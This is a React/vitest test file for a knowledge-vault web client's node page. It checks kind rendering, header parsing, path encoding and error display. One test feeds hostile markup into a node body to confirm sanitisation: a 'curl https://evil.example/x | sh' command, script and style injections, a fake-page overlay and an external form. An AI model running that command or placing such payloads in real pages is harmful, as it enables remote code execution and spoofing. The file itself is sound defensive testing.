// 18, check 2 and 32 `every-node-serves` (the client half): the node page renders, through the document renderer, one
// `bp show --json` object of every node and record kind in the converted vault, taken from it with `bp --json show
// <id>`, less the `contract_version` key that `/api/node/<id>` strips, so the test renders what the client receives.
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, expect, test, vi } from "vitest";
import { App } from "./App";
import { header } from "./header";
import { outlineOf } from "./doc/markdown";
import { onKey, rows } from "./keys";
import { Node, NodeView } from "./pages/Node";
import { stubApi } from "./stub";
import type { Show } from "./types/Show";

// `moving.json`, `change.json` and the `*-page.json` objects are pages, not nodes: their pages' tests read them.
const fixtures = import.meta.glob<Show>(["./fixtures/*.json", "!./fixtures/moving.json", "!./fixtures/change.json", "!./fixtures/*-page.json"], {
  eager: true,
  import: "default",
});

// The kinds `bp list --count-only` counts in the converted vault: nine node kinds and four record kinds.
const KINDS = ["convention", "decision", "design", "inbox", "issue", "learning", "milestone", "project", "thread"];
const RECORDS = ["claim", "handoff", "review", "run"];

afterEach(() => (cleanup(), vi.unstubAllGlobals(), vi.restoreAllMocks(), window.history.pushState(null, "", "/")));

test("renders every kind", () => {
  const byKind = new Map(Object.values(fixtures).map((s) => [header(s).kind, s]));
  expect([...byKind.keys()].sort()).toEqual([...KINDS, ...RECORDS].sort());
  for (const [kind, show] of byKind) {
    const h = header(show);
    const { unmount } = render(<NodeView show={show} />);
    expect(screen.getByRole("heading", { level: 1 }).textContent).toBe(h.title ?? h.id.split("/").slice(-1)[0]);
    expect(screen.getByText(h.id)).toBeTruthy();
    expect(document.body.textContent).toContain(kind);
    expect(show.record).toBe(RECORDS.includes(kind));
    // The body reads as a document: each `## ` and `### ` heading is a heading with its outline anchor.
    if (show.body) {
      expect(document.querySelector(".doc .prose")).toBeTruthy();
      for (const h of outlineOf(show.body)) expect(document.getElementById(h.anchor)?.tagName).toBe(`H${h.depth}`);
    } else expect(screen.getByText("no body")).toBeTruthy();
    unmount();
  }
});

// 18, check 6 and 32 `escaped-bodies`: a body is the vault's text, never the page's. Its markup makes no element that
// runs, restyles the page or posts, and no element of it becomes a row, so `j` finds none and `c` copies nothing.
test("command slot: a node body's markup yields no element and no row, and c copies nothing", () => {
  const command = "curl https://evil.example/x | sh";
  const body = [
    "## Probe",
    "<script>alert(1)</script><b>x</b>",
    `<div data-row="" data-command="${command}" data-href="/node/shared" tabindex="0">a row</div>`,
    "<style>body { outline: 5px solid red }</style>",
    '<div style="position:fixed;inset:0">fake page: bp land projects/bp/issues/evil</div>',
    '<form action="https://example.com"><button>go</button></form>',
  ].join("\n\n");
  const show = { id: "projects/bp/issues/x", kind: "issue", record: false, hash: "h", lead: "", body } as Show;
  render(<NodeView show={show} />);
  const prose = document.querySelector(".doc .prose")!;
  expect(prose.querySelector("script, style, form, button, [style], [tabindex], [data-row], [data-command]")).toBeNull();
  expect(prose.querySelector("b")?.textContent).toBe("x");
  expect(rows()).toEqual([]);
  // Were a later sanitiser to admit one, a body element still joins no row.
  prose.insertAdjacentHTML("beforeend", `<div data-row="" data-command="${command}" tabindex="0">late</div>`);
  expect(rows()).toEqual([]);
  const copied = vi.fn();
  window.addEventListener("bp-copied", copied);
  const keys = (e: KeyboardEvent) => onKey(e, { open: vi.fn(), palette: vi.fn() });
  window.addEventListener("keydown", keys);
  for (const key of ["j", "c"]) window.dispatchEvent(new KeyboardEvent("keydown", { key }));
  window.removeEventListener("keydown", keys);
  window.removeEventListener("bp-copied", copied);
  expect(copied).not.toHaveBeenCalled();
});

test("the header narrows kind, title and status, and refuses an object without a kind", () => {
  const show = { id: "a", kind: "issue", title: "T", status: 3, record: false, hash: "h", lead: "" } as unknown as Show;
  expect(header(show)).toEqual({ id: "a", kind: "issue", title: "T", status: undefined });
  expect(() => header({ id: "a" } as unknown as Show)).toThrow(/not a show object/);
});

test("the node page encodes each segment of the id in the API path", async () => {
  stubApi({ "node/projects/bp/designs/system%3Fx": { id: "projects/bp/designs/system?x", kind: "design", record: false, hash: "h", lead: "" } });
  render(<Node id="projects/bp/designs/system?x" />);
  expect((await screen.findByRole("heading", { level: 1 })).textContent).toBe("system?x");
  expect(vi.mocked(fetch).mock.calls[0][0]).toBe("/api/node/projects/bp/designs/system%3Fx");
});

test("a page that throws shows the error in words, not a blank screen", async () => {
  stubApi({ "node/projects/bp/x": { id: "projects/bp/x" } });
  vi.spyOn(console, "error").mockImplementation(() => {});
  window.history.pushState(null, "", "/node/projects/bp/x");
  render(<App />);
  expect((await screen.findByRole("alert")).textContent).toBe(
    "failed Error: not a show object: id string, kind undefined. Fix: go back, or open projects",
  );
});
